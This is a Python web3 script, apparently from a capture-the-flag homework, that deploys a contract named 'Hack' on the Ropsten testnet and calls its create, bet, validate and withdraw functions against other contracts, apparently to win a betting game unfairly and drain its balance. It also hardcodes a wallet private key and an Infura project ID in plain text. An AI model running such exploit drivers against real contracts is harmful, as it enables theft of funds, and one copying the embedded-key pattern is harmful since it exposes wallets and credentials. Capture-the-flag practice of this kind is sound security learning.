from web3 import Web3, HTTPProvider
from solc import compile_files
import os

myAddress = '0xB3580FB6944BC704149CE71DF2247897755Ba7d7'
myKey = '0x7613f3f0e75e124b78280cde672d5870ea87ebdea19aca556e1c6a720e8fbe82'
w3 = Web3(HTTPProvider(r'https://ropsten.infura.io/v3/6a17ad8ec1ff4b5c97d809725b515aac'))

def call(function, value):
    txn = function.buildTransaction({'value': w3.toWei(value, 'ether'), 'nonce': w3.eth.getTransactionCount(myAddress), 'gas': w3.eth.getBlock("latest").gasLimit, 'gasPrice': w3.toWei('1000', 'gwei')})
    sign = w3.eth.account.sign_transaction(txn, myKey)
    return w3.eth.sendRawTransaction(sign.rawTransaction)

os.environ['SOLC_BINARY'] = '/mnt/c/Users/B10515025/Desktop/NTUST_CTF/HW3/solc.exe'
ALL_OUTPUT_VALUES = ("abi", "asm", "ast", "bin", "bin-runtime", "devdoc", "interface", "opcodes", "userdoc",)
compiled_sol = compile_files(['./Hack.sol'], output_values = ALL_OUTPUT_VALUES)

#Hack = w3.eth.contract(abi = compiled_sol['./Hack.sol:Hack']['abi'], bytecode = compiled_sol['./Hack.sol:Hack']['bin'])
#hash = call(Hack.constructor('Hack'), 0).hex()
#print(hash)

hash = '0xbdef9a1b6aec04c0adc6dfe220ddd00a02e1cf744ac45b36c010ce2a746b253c'
address = w3.eth.getTransactionReceipt(hash)['contractAddress']
print(address)

Hack = w3.eth.contract(address = address, abi = compiled_sol['./Hack.sol:Hack']['abi'])
#call(Hack.functions.create('0x8e0a809B1f413deB6427535cC53383954DBF8329'), 0.5)
#call(Hack.functions.bet('0x407dCEaD12D94d3a1c6AD5440c0cDd7CA71DcD44', 1603952370), 0.1)
#call(Hack.functions.validate('0x8e0a809B1f413deB6427535cC53383954DBF8329', int('0x2e99701a7275da17f5755b680d3e1b0e1f4f0f0fd5dc2dd60c83a3e76f6d33bb', 16)), 0)
call(Hack.functions.withdraw(), 0)



